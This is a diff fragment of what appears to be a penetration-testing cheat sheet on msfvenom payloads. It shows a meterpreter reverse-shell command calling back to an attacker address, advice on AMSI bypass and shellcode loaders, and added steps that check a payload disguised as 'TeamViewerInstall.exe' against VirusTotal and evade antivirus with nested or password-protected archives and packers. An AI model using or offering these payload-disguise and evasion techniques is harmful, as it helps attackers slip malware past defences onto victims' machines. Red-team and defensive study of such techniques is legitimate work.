@@ -124,6 +124,17 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
 > [!note]
 > Encoding alone rarely bypasses modern AV/EDR. Combine with custom shellcode loaders, Shellter, Donut, or AMSI bypass for better results.
 
+**Check detection before deploying:**
+```bash
+# Submit a generated payload to VirusTotal (needs an API key)
+msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
+```
+
+**Other evasion angles beyond encoding:**
+- Wrap the payload in multiple layers of compression/archival formats
+- Password-protect the archive (defeats inline AV extraction)
+- Use packers to obfuscate the PE
+
 ---
 
 ## Trojanize (Inject into Existing Binary)
